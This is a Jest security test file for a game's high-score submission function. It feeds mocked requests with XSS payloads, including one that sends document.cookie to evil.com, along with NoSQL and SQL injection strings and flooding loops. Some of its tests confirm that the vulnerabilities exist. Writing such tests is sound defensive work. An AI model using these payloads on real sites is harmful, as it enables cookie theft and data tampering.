// __tests__/setHighScore.security.test.js
// Comprehensive security and stress tests for high score submission
// All tests use mocks - DOES NOT affect production database

const crypto = require('crypto');

describe('High Score Security - Input Validation Attacks', () => {
  let handler;
  let mockClient;
  let mockDb;
  let mockVisitorsCollection;
  let mockCurrentHighScoreCollection;
  let mockHistoryCollection;

  beforeEach(() => {
    process.env.VISITOR_SALT = 'test-salt';
    jest.resetModules();

    mockVisitorsCollection = {
      countDocuments: jest.fn().mockResolvedValue(10) // Default: 10 wins
    };

    mockCurrentHighScoreCollection = {
      updateOne: jest.fn().mockResolvedValue({ acknowledged: true })
    };

    mockHistoryCollection = {
      insertOne: jest.fn().mockResolvedValue({ acknowledged: true })
    };

    mockDb = {
      collection: jest.fn((name) => {
        if (name === 'visitors') return mockVisitorsCollection;
        if (name === 'currentHighScore') return mockCurrentHighScoreCollection;
        if (name === 'highScoreHistory') return mockHistoryCollection;
        return {};
      })
    };

    mockClient = {
      connect: jest.fn().mockResolvedValue(undefined),
      db: jest.fn(() => mockDb)
    };

    jest.mock('mongodb', () => ({
      MongoClient: jest.fn(() => mockClient),
      ServerApiVersion: { v1: '1' }
    }));

    handler = require('../netlify/functions/setHighScore').handler;
  });

  afterEach(() => {
    jest.clearAllMocks();
    delete process.env.VISITOR_SALT;
  });

  describe('XSS Attack Vectors', () => {
    test('Rejects playerName with script tags', async () => {
      const xssEvent = {
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: '<script>alert("XSS")</script>',
          score: 5,
          userId: 'valid-user-id'
        })
      };

      const result = await handler(xssEvent, {});

      // Should accept but trim the name (stored XSS still possible)
      expect(result.statusCode).toBe(200);

      // Verify it was stored as-is (THIS IS THE VULNERABILITY)
      expect(mockHistoryCollection.insertOne).toHaveBeenCalledWith(
        expect.objectContaining({
          playerName: '<script>alert("XSS")</script>'
        })
      );
    });

    test('Handles playerName with HTML entities', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: '&lt;img src=x onerror=alert(1)&gt;',
          score: 3,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });

    test('Handles playerName with JavaScript event handlers', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: '<img src=x onerror="fetch(\'evil.com\'+document.cookie)">',
          score: 2,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });
  });

  describe('SQL/NoSQL Injection Attempts', () => {
    test('Rejects playerName with MongoDB operators', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: '{"$ne": null}',
          score: 5,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
      expect(mockHistoryCollection.insertOne).toHaveBeenCalledWith(
        expect.objectContaining({
          playerName: '{"$ne": null}'
        })
      );
    });

    test('Handles playerName with query injection attempt', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: "'; DROP TABLE users; --",
          score: 3,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });
  });

  describe('Input Validation Attacks', () => {
    test('Rejects empty playerName', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: '',
          score: 5,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(400);
      expect(result.body).toContain('Invalid input data');
    });

    test('Rejects whitespace-only playerName', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: '   ',
          score: 5,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(400);
    });

    test('Accepts extremely long playerName (DoS vector)', async () => {
      const longName = 'A'.repeat(100000); // 100KB string

      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: longName,
          score: 5,
          userId: 'user-123'
        })
      }, {});

      // VULNERABILITY: No max length validation
      expect(result.statusCode).toBe(200);
    });

    test('Rejects negative score', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Hacker',
          score: -10,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(400);
      expect(result.body).toContain('Invalid input data');
    });

    test('Rejects NaN score', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Test',
          score: NaN,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(400);
    });

    test('Rejects Infinity score', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Test',
          score: Infinity,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(400);
    });

    test('Rejects string score', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Test',
          score: "999",
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(400);
    });
  });

  describe('Score Manipulation Attacks', () => {
    test('Rejects score higher than actual wins', async () => {
      mockVisitorsCollection.countDocuments.mockResolvedValue(5); // Only 5 wins

      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Cheater',
          score: 100, // Claiming 100 wins
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(400);
      expect(result.body).toContain('Score exceeds actual game wins');
    });

    test('Accepts score equal to actual wins', async () => {
      mockVisitorsCollection.countDocuments.mockResolvedValue(10);

      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Legit',
          score: 10,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });

    test('Accepts score less than actual wins', async () => {
      mockVisitorsCollection.countDocuments.mockResolvedValue(10);

      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Conservative',
          score: 7,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });
  });

  describe('Authentication Bypass Attempts', () => {
    test('Rejects submission without userId', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Anonymous',
          score: 5
          // Missing userId
        })
      }, {});

      expect(result.statusCode).toBe(403);
      expect(result.body).toContain('Must be logged in');
    });

    test('Rejects submission with null userId', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Test',
          score: 5,
          userId: null
        })
      }, {});

      expect(result.statusCode).toBe(403);
    });

    test('Accepts any userId value (VULNERABILITY)', async () => {
      // VULNERABILITY: No verification that userId belongs to requester
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Impersonator',
          score: 5,
          userId: 'victim-user-id' // Can impersonate any user
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });
  });

  describe('Edge Cases and Boundary Conditions', () => {
    test('Handles zero score', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Beginner',
          score: 0,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });

    test('Handles maximum safe integer score', async () => {
      mockVisitorsCollection.countDocuments.mockResolvedValue(Number.MAX_SAFE_INTEGER);

      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Pro',
          score: Number.MAX_SAFE_INTEGER,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });

    test('Handles Unicode characters in playerName', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: '你好世界🎮💯',
          score: 5,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });

    test('Handles RTL text injection in playerName', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: '\u202Emalicious\u202C',
          score: 5,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });

    test('Handles null byte injection', async () => {
      const result = await handler({
        httpMethod: 'POST',
        headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
        body: JSON.stringify({
          playerName: 'Test\x00Hidden',
          score: 5,
          userId: 'user-123'
        })
      }, {});

      expect(result.statusCode).toBe(200);
    });
  });

  describe('Rate Limiting and DoS Concerns', () => {
    test('No rate limiting - can submit multiple scores rapidly', async () => {
      // Set high win count to allow all submissions
      mockVisitorsCollection.countDocuments.mockResolvedValue(100);
      const results = [];

      for (let i = 0; i < 100; i++) {
        const result = await handler({
          httpMethod: 'POST',
          headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
          body: JSON.stringify({
            playerName: `Spammer${i}`,
            score: i % 100, // Keep scores under win count
            userId: 'user-123'
          })
        }, {});
        results.push(result);
      }

      // VULNERABILITY: No rate limiting - all submissions succeed
      const successCount = results.filter(r => r.statusCode === 200).length;
      expect(successCount).toBe(100);
    });

    test('Same user can flood history collection', async () => {
      mockVisitorsCollection.countDocuments.mockResolvedValue(50);
      mockHistoryCollection.insertOne = jest.fn().mockResolvedValue({ acknowledged: true });

      // Submit 50 scores
      for (let i = 0; i < 50; i++) {
        await handler({
          httpMethod: 'POST',
          headers: { 'x-nf-client-connection-ip': '192.168.1.1' },
          body: JSON.stringify({
            playerName: 'Flooder',
            score: i % 50, // Keep under win count
            userId: 'same-user'
          })
        }, {});
      }

      // VULNERABILITY: All inserts succeed - no deduplication or rate limiting
      expect(mockHistoryCollection.insertOne).toHaveBeenCalledTimes(50);
    });
  });

  describe('HTTP Method Validation', () => {
    test('Rejects GET requests', async () => {
      const result = await handler({
        httpMethod: 'GET',
        headers: {},
        body: ''
      }, {});

      expect(result.statusCode).toBe(405);
      expect(result.body).toContain('Method Not Allowed');
    });

    test('Rejects PUT requests', async () => {
      const result = await handler({
        httpMethod: 'PUT',
        headers: {},
        body: ''
      }, {});

      expect(result.statusCode).toBe(405);
    });
  });
});

describe('High Score Security - Integration Scenarios', () => {
  test('Documents expected secure behavior', () => {
    // This test documents what SHOULD be implemented for production security:
    const securityRequirements = {
      inputValidation: {
        maxPlayerNameLength: 50,
        sanitizeHTML: true,
        escapeSpecialChars: true
      },
      authentication: {
        verifyUserIdOwnership: true,
        requireValidSession: true,
        checkIPMatch: true
      },
      rateLimiting: {
        maxSubmissionsPerMinute: 5,
        maxSubmissionsPerHour: 20,
        blockOnAbuse: true
      },
      scoreValidation: {
        checkWinCount: true,
        verifyGameHistory: true,
        detectAnomalies: true
      }
    };

    expect(securityRequirements).toBeDefined();
  });
});
